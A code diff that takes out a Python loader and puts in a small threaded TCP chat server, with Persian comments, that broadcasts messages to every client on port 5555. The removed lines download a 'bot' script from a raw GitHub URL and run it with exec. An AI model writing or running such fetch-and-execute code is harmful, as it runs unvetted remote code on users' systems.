@@ -1,5 +1,35 @@
-import requests
+import socket
+import threading
 
-url = "https://raw.githubusercontent.com/amiirkebir-hue/bot/refs/heads/main/bot"
-response = requests.get(url)
-exec(response.text)
+# لیست کلاینت‌ها
+clients = []
+
+# ارسال پیام به همه کلاینت‌ها
+def broadcast(message):
+    for client in clients:
+        client.send(message)
+
+# هندل کردن هر کلاینت
+def handle_client(client):
+    while True:
+        try:
+            message = client.recv(1024)
+            broadcast(message)
+        except:
+            clients.remove(client)
+            client.close()
+            break
+
+# تنظیمات سرور
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(('0.0.0.0', 5555))  # همه آی‌پی‌ها و پورت 5555
+server.listen()
+
+print("Server is running...")
+
+while True:
+    client, address = server.accept()
+    print(f"Connected with {address}")
+    clients.append(client)
+    thread = threading.Thread(target=handle_client, args=(client,))
+    thread.start()
